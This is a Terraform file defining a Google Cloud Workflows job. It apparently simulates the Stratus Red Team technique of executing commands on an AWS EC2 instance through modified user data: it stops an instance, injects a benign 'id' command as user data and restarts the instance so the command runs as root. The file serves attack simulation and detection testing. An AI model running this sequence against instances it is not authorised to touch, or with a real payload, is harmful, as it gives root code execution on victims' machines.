data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}

resource "google_workflows_workflow" "workflow_to_invoke_aws_ec2_modify_user_data_attack" {
  name            = "aws-ec2-modify-user-data-srt"
  description     = "A workflow intended to match the functionality of the Status Red Team attack technique 'Execute Commands on EC2 Instance via User Data': https://stratus-red-team.cloud/attack-techniques/AWS/aws.execution.ec2-user-data/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF


######################################################################################
## Attack Description
######################################################################################
#### Attempts to simulate an attack on an EC2 instance though the execution of code 
#### via malicous User Data.
#### This attack technique stops the targeted EC2 instance, modifies the instance attribute
#### by injecting malicious user data and restarts the EC2 instance.
#### Upon starting, the malicious script in user data is automatically executed as the root user.

######################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}

######################################################################################
## User Agent
######################################################################################
#### Excutes with User-Agent: "Derf-AWS-EC2-Modify-User-Data-WORKFLOWEXECUTIONID"


######################################################################################
## Main Workflow Execution
######################################################################################

main:
  params: [args]
  steps:
    - assign:
        assign:
        - user: $${args.user}
        - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  
    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - StopInstance:
        call: StopInstance
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response
    - ModifyInstanceAttribute:
        call: ModifyInstanceAttribute
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response
    - RestartInstance:
        call: RestartInstance
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################


StopInstance:
  params: [user, appEndpoint]
  steps:  
    - StopInstance:
        try:
            steps:
                - callStep:    
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                        Content-Type: application/json
                      body:
                          HOST: "ec2.us-east-1.amazonaws.com"
                          REGION: "us-east-1"
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.amazonaws.com/"
                          BODY: "Action=StopInstances&Version=2016-11-15&InstanceId.1=${local.instance_id}"
                          UA: '$${"Derf-AWS-EC2-Modify-User-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          USER: $${user}
                          VERB: POST
                    result: response

                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 409}
                        raise: $${response}
        retry:
            predicate: $${custom_predicate}
            max_retries: 8
            backoff:
                initial_delay: 1
                max_delay: 60
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: error

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Modify User Data Attack | This is typically a permission error"

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS EC2 Modify User Data Attack"

    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Modify User Data Attack"

ModifyInstanceAttribute:
  params: [user, appEndpoint]
  steps:  
    - ModifyInstanceAttribute:
        call: http.post
        args:
          url: '$${appEndpoint+"/submitRequest"}'
          auth:
              type: OIDC
          headers:
            Content-Type: application/json
          body:
              HOST: "ec2.us-east-1.amazonaws.com"
              REGION: "us-east-1"
              SERVICE: "ec2" 
              ENDPOINT: "https://ec2.amazonaws.com/"
              BODY: "Action=ModifyInstanceAttribute&Version=2016-11-15&InstanceId=${local.instance_id}&UserData.Value=id%2Ftmp%2Fidtxt"
              UA: '$${"Derf-AWS-EC2-Modify-User-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
              CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
              USER: $${user}
              VERB: POST
        result: response

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: error

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS EC2 Modify User Data Attack"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Modify User Data Attack | This is typically a permission error"

    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Modify User Data Attack"

RestartInstance:
  params: [user, appEndpoint]
  steps:  
    - RestartInstance:
        try:
            steps:
                - callStep:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                        Content-Type: application/json
                      body:
                          HOST: "ec2.us-east-1.amazonaws.com"
                          REGION: "us-east-1"
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.amazonaws.com/"
                          BODY: "Action=StartInstances&Version=2016-11-15&InstanceId.1=${local.instance_id}"
                          UA: '$${"Derf-AWS-EC2-Modify-User-Data=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          USER: $${user}
                          VERB: POST
                    result: response

                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 409}
                        raise: $${response}
        retry:
            predicate: $${custom_predicate}
            max_retries: 8
            backoff:
                initial_delay: 1
                max_delay: 60
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: error

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS EC2 Modify User Data Attack"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Modify User Data Attack | This is typically a permission error"

    - error:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Modify User Data Attack"


custom_predicate:
  params: [response]
  steps:
    - what_to_repeat:
        switch:
          - condition: $${response.body.responseCode == 400}
            return: true
          - condition: $${response.body.responseCode == 409}
            return: true
          - condition: $${response.body.responseCode == 500}
            return: true
    - otherwise:
        return: false

  EOF

}